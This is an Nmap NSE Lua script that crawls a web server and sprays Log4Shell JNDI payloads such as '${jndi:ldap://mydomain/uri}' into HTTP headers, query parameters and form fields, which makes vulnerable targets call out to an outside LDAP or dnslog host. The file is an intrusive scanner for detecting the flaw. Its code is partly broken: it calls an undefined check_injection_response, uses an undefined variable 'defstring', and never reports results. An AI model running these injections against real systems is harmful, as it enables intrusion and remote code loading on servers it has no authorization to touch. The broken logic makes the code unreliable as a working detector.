local http = require "http"
local httpspider = require "httpspider"
local io = require "io"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local url = require "url"

description = [[
Spiders an HTTP server looking for URLs containing queries vulnerable to an log4j injection attack.
]]

author = "Vlatko Kosturjak"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","log4shell"}

-- portrule = shortport.port_or_service({80, 443}, {"http","https"})
portrule = shortport.http

--[[
Pattern match response from a submitted injection query to see
if it is vulnerable
--]]

local errorstrings = {}

local payload = stdnse.get_script_args(SCRIPT_NAME..".payload")
local gpayload = stdnse.get_script_args("log4shell.payload")
-- default content to fill
local defcontent = stdnse.get_script_args(SCRIPT_NAME..".content") or "sampleString"

local request_opts = {
  header = {
    Referer = payload,
  },
}
request_opts['header']['User-Agent'] = payload
request_opts['header']['X-Api-Version'] = payload
request_opts['header']['X-Forwarded-For'] = payload

--[[
Replaces usual queries with malicious query and return a table with them.
]]--

local function build_injection_vector(urls)
  local utab, k, v, urlstr, response
  local qtab, old_qtab, results
  local all = {}

  for _, injectable in ipairs(urls) do
    if type(injectable) == "string"  then
      utab = url.parse(injectable)
      qtab = url.parse_query(utab.query)

      for k, v in pairs(qtab) do
        old_qtab = qtab[k];
        qtab[k] = qtab[k] ..  " "..payload

        utab.query = url.build_query(qtab)
        urlstr = url.build(utab)
        table.insert(all, urlstr)

        qtab[k] = old_qtab
        utab.query = url.build_query(qtab)
      end
    end
  end
  return all
end

--[[
Creates a pipeline table and returns the result
]]--
local function inject(host, port, injectable)
  local all = {}
  for k, v in pairs(injectable) do
    all = http.pipeline_add(v, nil, all, 'GET')
  end
  return http.pipeline_go(host, port, all)
end

-- checks if a field is kind of input type we want to inject into
local function dynamic_field(field_type)
  return field_type=="text" or field_type=="radio" or field_type=="checkbox" or field_type=="textarea"
end

-- generates postdata with value of defstring for every field of a form
local function generate_safe_postdata(form)
  local postdata = {}
  for _,field in ipairs(form["fields"]) do
    if dynamic_field(field["type"]) then
      postdata[field["name"]] = defcontent
    end
  end
  return postdata
end

local function generate_get_string(data)
  local get_str = {"?"}
  for name,value in pairs(data) do
    get_str[#get_str+1]=url.escape(name).."="..url.escape(value).."&"
  end
  return table.concat(get_str)
end

-- checks each field of a form to see if it's vulnerable
local function check_form(form, host, port, path)
  local vulnerable_fields = {}
  local postdata = generate_safe_postdata(form)
  local sending_function, response

  local action_absolute = string.find(form["action"], "^https?://")
  -- determine the path where the form needs to be submitted
  local form_submission_path
  if action_absolute then
    form_submission_path = form["action"]
  else
    local path_cropped = string.match(path, "(.*/).*")
    path_cropped = path_cropped and path_cropped or ""
    form_submission_path = path_cropped..form["action"]
  end


  -- determine should the form be sent by post or get
  local sending_function
  local header_function
  if form["method"]=="post" then
    header_function = function(data) return http.post(host, port, form_submission_path, request_opts, nil, data) end
    sending_function = function(data) return http.post(host, port, form_submission_path, nil, nil, data) end
  else
    header_function = function(data) return http.get(host, port, form_submission_path..generate_get_string(data), request_opts) end
    sending_function = function(data) return http.get(host, port, form_submission_path..generate_get_string(data), nil) end
  end

  for _,field in ipairs(form["fields"]) do
    if dynamic_field(field["type"]) then
      stdnse.debug2("checking field %s", field["name"])
      postdata[field["name"]] = payload
      response = sending_function(postdata)
      if response and response.body and response.status==200 then
        if check_injection_response(response) then
          vulnerable_fields[#vulnerable_fields+1] = field["name"]
        end
      end
      postdata[field["name"]] = defstring
      response = header_function(postdata)
    end
  end
  return vulnerable_fields
end

action = function(host, port)
  -- crawl to find injectable urls
  local ropts = request_opts
  ropts['scriptname']=SCRIPT_NAME
  local crawler = httpspider.Crawler:new(host, port, nil, ropts)
  local injectable = {}

  if not payload then
    if not gpayload then
      if nmap.registry['dnslog-cn'] then
	 stdnse.debug2("registry not present")
	 local registry = nmap.registry['dnslog-cn']
	 if registry.domain then
	       payload = "${jndi:ldap://{{target}}."..registry.domain.."}"
	 else
	       stdnse.debug2("session not present")
	 end
      else
	 payload = "${jndi:ldap://mydomain/uri}"
      end
      stdnse.debug1("Setting the payload to default payload:"..payload)
    else
      payload=gpayload
    end
  end

  while(true) do
    local status, r = crawler:crawl()
    if (not(status)) then
      if (r.err) then
        return stdnse.format_output(false, r.reason)
      else
        break
      end
    end

    -- first we try attack on forms
    if r.response and r.response.body and r.response.status==200 then
      local all_forms = http.grab_forms(r.response.body)
      for _,form_plain in ipairs(all_forms) do
        local form = http.parse_form(form_plain)
        local path = r.url.path
        if form and form.action then
          local vulnerable_fields = check_form(form, host, port, path)
        end
      end --for
    end --if
    local links = {}
    if r.response.status and r.response.body then
      links = httpspider.LinkExtractor:new(r.url, r.response.body, crawler.options):getLinks()
    end
    for _,u in ipairs(links) do
      if url.parse(u).query then
        table.insert(injectable, u)
      end
    end
  end

  -- try to inject
  local results_queries = {}
  if #injectable > 0 then
    stdnse.debug1("Testing %d suspicious URLs", #injectable)
    local injectableQs = build_injection_vector(injectable)
    local responses = inject(host, port, injectableQs)
  end

  return
end

